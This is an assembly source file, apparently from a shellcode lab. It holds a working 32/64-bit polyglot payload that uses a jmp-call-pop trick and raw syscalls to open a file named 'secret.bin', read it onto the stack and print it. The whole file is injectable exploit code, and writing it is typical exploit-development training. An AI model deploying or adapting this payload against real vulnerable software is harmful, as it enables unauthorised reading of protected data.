#include <sys/syscall.h>

#define STRLEN  10
#define BUFSIZE 2000
#define STRING  "secret.bin"

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

x32:
  .code32
  xor    eax, eax
  .byte  0x40
  mov    bh, 1
  test   eax, eax
  jz     x64

  pop    esi
  lea    ebx, [esi+8]
  xor    eax, eax             /* clear eax */
  mov    [ebx + 2], al       /* null-terminate the string */

  mov    al, 5         /* syscall number for open */
  mov    ebx, esi             /* arg 1: string pathname */
  xor    ecx, ecx             /* arg 2: flags (O_RDONLY) */
  xor    edx, edx             /* arg 3: mode (0) */
  int    0x80                 /* invoke syscall */

  mov    ebx, eax             /* ebx = fd (file descriptor from open) */
  xor    eax, eax
  mov    ax, BUFSIZE
  sub    esp, eax
  mov    ecx, esp             /* ecx = buf (use stack as buffer) */
  mov    dx, BUFSIZE          /* edx = nbytes (2000 bytes) */
  xor    eax, eax
  mov    al, 3         /* syscall number for read */
  int    0x80                 /* invoke syscall */

  xor    eax, eax 
  xor    ebx, ebx             /* ebx = 0 */
  inc    ebx                  /* ebx = 1 */
  mov    al, 4        /* syscall number for write */
  int    0x80                 /* invoke syscall */

  xor    ebx, ebx             /* ebx = 0 (exit code) */
  xor    eax, eax 
  mov    al, 1         /* syscall number for exit */
  int    0x80                 /* invoke syscall */

x64:
  .code64
  pop    rsi                  /* esi points to STRING */
  lea    rdi, [rsi+8]
  xor    rax, rax             /* clear eax */
  mov    [rdi + 2], al       /* null-terminate the string */

  mov    al, SYS_open         /* syscall number for open */
  mov    rdi, rsi             /* arg 1: string pathname */
  xor    rsi, rsi             /* arg 2: flags (O_RDONLY) */
  xor    rdx, rdx             /* arg 3: mode (0) */
  syscall

  mov    rdi, rax             /* ebx = fd (file descriptor from open) */
  xor    rax, rax
  mov    ax, BUFSIZE
  sub    rsp, rax
  mov    rsi, rsp             /* ecx = buf (use stack as buffer) */
  mov    dx, BUFSIZE          /* edx = nbytes (2000 bytes) */
  xor    rax, rax             /* syscall number for read */       
  syscall

  xor    rdi, rdi             /* ebx = 0 */
  inc    rdi                  /* ebx = 1 */
  xor    rax, rax
  mov    al, SYS_write        /* syscall number for write */
  syscall

  xor    rdi, rdi             /* ebx = 0 (exit code) */
  xor    rax, rax
  mov    al, SYS_exit         /* syscall number for exit */
  syscall



calladdr:
  call    x32
  .string STRING